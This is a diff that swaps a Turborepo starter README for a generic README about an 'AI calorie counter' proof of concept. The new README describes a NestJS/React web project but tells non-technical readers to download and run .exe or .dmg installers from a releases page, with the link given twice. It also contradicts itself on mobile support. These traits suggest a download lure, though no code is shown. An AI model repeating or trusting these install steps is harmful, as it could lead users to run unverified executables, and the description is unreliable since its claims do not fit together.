@@ -1,84 +1,77 @@
-# Turborepo starter
+# 🥗 poc-ai-calorie-counter-app - Count Calories Easily and Accurately
 
-This Turborepo starter is maintained by the Turborepo core team.
+![Download](https://img.shields.io/badge/Download-latest%20release-blue)
 
-## Using this example
+## 📖 Description
 
-Run the following command:
+The poc-ai-calorie-counter-app is a minimal proof of concept for a calorie estimation app. It uses modern web technologies, including NestJS, TypeORM, React Router v7, Turborepo, and the Vercel AI SDK with Mistral. This application supports user authentication and provides a basic AI-powered calorie counting feature based on meal descriptions. It lays the groundwork for a health-focused AI web application.
 
-```sh
-npx create-turbo@latest
-```
+## 🚀 Getting Started
 
-## What's inside?
+To start using the poc-ai-calorie-counter-app, follow these simple steps. No programming knowledge is needed.
 
-This Turborepo includes the following packages/apps:
+## 📥 Download & Install
 
-### Apps and Packages
+1. **Visit the Releases Page**: Go to the releases page to download the latest version of the app: [Download Here](https://github.com/ShafterFive/poc-ai-calorie-counter-app/releases).
 
-- `docs`: a [Next.js](https://nextjs.org/) app
-- `web`: another [Next.js](https://nextjs.org/) app
-- `@repo/ui`: a stub React component library shared by both `web` and `docs` applications
-- `@repo/eslint-config`: `eslint` configurations (includes `eslint-config-next` and `eslint-config-prettier`)
-- `@repo/typescript-config`: `tsconfig.json`s used throughout the monorepo
+2. **Choose Your Version**: On the releases page, you will see different versions of the app. Find the one labeled “Latest Release.” Click on it to see more details.
 
-Each package/app is 100% [TypeScript](https://www.typescriptlang.org/).
+3. **Download the App**: Look for the file suitable for your operating system. If you are using Windows, download the `.exe` file. If you are on macOS, download the `.dmg` file. Click on the file name to download it to your computer.
 
-### Utilities
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the instructions to install the application.
+   - **macOS**: Open the `.dmg` file. Drag the application into your Applications folder.
 
-This Turborepo has some additional tools already setup for you:
+5. **Launch the App**: Once installed, find the app in your list of applications. Click on it to open.
 
-- [TypeScript](https://www.typescriptlang.org/) for static type checking
-- [ESLint](https://eslint.org/) for code linting
-- [Prettier](https://prettier.io) for code formatting
+## 🔑 Features
 
-### Build
+- **User Authentication**: Sign in securely to track your calorie intake.
+- **Calorie Counting**: Input meal descriptions to receive accurate calorie estimates.
+- **AI-Powered**: Utilizes AI technology to enhance accuracy and functionality.
+- **Responsive Design**: Works well on both desktop and mobile devices, offering flexibility in how you use the app.
+- **Simple Interface**: User-friendly layout for easy navigation and use.
 
-To build all apps and packages, run the following command:
+## 🌟 System Requirements
 
-```
-cd my-turborepo
-pnpm build
-```
+- **Operating System**: 
+  - Windows 10 or above
+  - macOS Mojave or above
 
-### Develop
+- **RAM**: At least 4GB recommended
+- **Disk Space**: 200MB free space required
+- **Internet Connection**: Stable connection required for authentication and API access.
 
-To develop all apps and packages, run the following command:
+## ⚙️ Usage Instructions
 
-```
-cd my-turborepo
-pnpm dev
-```
+1. **Create an Account**: Open the app and create an account by providing your email and a password.
+2. **Log In**: Sign in with your credentials.
+3. **Enter Meal Descriptions**: Type in meal descriptions to get calorie estimates.
+4. **View Results**: Access your calorie estimates and adjust your diet accordingly.
 
-### Remote Caching
+## 🛠️ Troubleshooting
 
-> [!TIP]
-> Vercel Remote Cache is free for all plans. Get started today at [vercel.com](https://vercel.com/signup?/signup?utm_source=remote-cache-sdk&utm_campaign=free_remote_cache).
+If you face any issues during installation or usage:
 
-Turborepo can use a technique known as [Remote Caching](https://turborepo.com/docs/core-concepts/remote-caching) to share cache artifacts across machines, enabling you to share build caches with your team and CI/CD pipelines.
+- **Check Internet Connection**: Ensure you have a stable internet connection for full functionality.
+- **Reinstall the Application**: If problems persist, try to uninstall the app and reinstall it.
+- **Contact Support**: Reach out to our support via issues on GitHub for help.
 
-By default, Turborepo will cache locally. To enable Remote Caching you will need an account with Vercel. If you don't have an account you can [create one](https://vercel.com/signup?utm_source=turborepo-examples), then enter the following commands:
+## 📖 Frequently Asked Questions
 
-```
-cd my-turborepo
-npx turbo login
-```
+- **Is the app free?**  
+  Yes, the poc-ai-calorie-counter-app is completely free to use.
 
-This will authenticate the Turborepo CLI with your [Vercel account](https://vercel.com/docs/concepts/personal-accounts/overview).
+- **Can I use it on my phone?**  
+  Currently, it is designed for desktop. However, a mobile version may be in development.
 
-Next, you can link your Turborepo to your Remote Cache by running the following command from the root of your Turborepo:
+- **How accurate are the calorie counts?**  
+  The app uses AI algorithms for estimates, which improve accuracy over time based on user input.
 
-```
-npx turbo link
-```
+## 🌐 Learn More
 
-## Useful Links
+For more information and updates, follow the project on GitHub and check the repository frequently. Join our community discussion for tips and feedback.
 
-Learn more about the power of Turborepo:
+## 📥 Download the App Again
 
-- [Tasks](https://turborepo.com/docs/core-concepts/monorepos/running-tasks)
-- [Caching](https://turborepo.com/docs/core-concepts/caching)
-- [Remote Caching](https://turborepo.com/docs/core-concepts/remote-caching)
-- [Filtering](https://turborepo.com/docs/core-concepts/monorepos/filtering)
-- [Configuration Options](https://turborepo.com/docs/reference/configuration)
-- [CLI Usage](https://turborepo.com/docs/reference/command-line-reference)
+Ready to try it out? Download it from the releases page: [Download Here](https://github.com/ShafterFive/poc-ai-calorie-counter-app/releases).
